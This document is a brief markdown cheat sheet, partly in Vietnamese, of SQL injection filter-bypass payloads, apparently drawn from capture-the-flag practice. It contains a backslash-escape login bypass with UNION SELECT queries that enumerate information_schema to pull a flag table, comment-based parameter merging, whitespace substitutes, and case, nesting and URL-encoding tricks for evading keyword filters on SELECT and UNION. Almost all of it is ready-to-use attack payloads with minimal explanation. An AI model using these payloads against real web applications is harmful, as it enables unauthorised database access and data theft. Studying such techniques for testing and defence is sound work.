# BYPASS 

## Bypass '
```sql
username: \
password: UNION SELECT table_name FROM information_schema.tables WHERE table_name like "%flag%"-- -
UNION SELECT column_name FROM information_schema.columns WHERE table_name like "flag_304ad593"-- -
UNION SELECT flag_3e53dc FROM flag_304ad593-- -

=> Dạng : "select username from users where username='\'and password=' UNION SELECT ....'  ";
```
Đoạn `\'and password=` sẽ đc coi là tên username vì \' đã vô hiệu hóa dấu '

```url
?amount=-1/*&name=*/ or 1=1-- -
```
=> Dạng dùng comment lọc tham số đầu vào kết hợp 2 query

## Bypass space 

```sql
/**/
-1/**/or/**/1=1-- -  (-1 or 1=1-- -)
%0d (CR)
%00 (null byte)
%0b ()
%0c

```

## Bypass select 
```sql
Select 
SeLeCt
SELECT 
SELSELECTECT
SEL/**/ECT
%00SELECT   
%53%45%4c%45%43%54                   #encode url 1l
%2553%2545%254c%2545%2543%2554       #encode url 2l

```

## Bypass union
```sql
uNion
UniOn
UNUNIONION
UNUNIONION%0dSELSELECTECT%0d

```

## Replaced Keywords
```sql
UNunionION SEselectLECT
uni%0bon se%0blect    # bypass keywords in Sql 

```


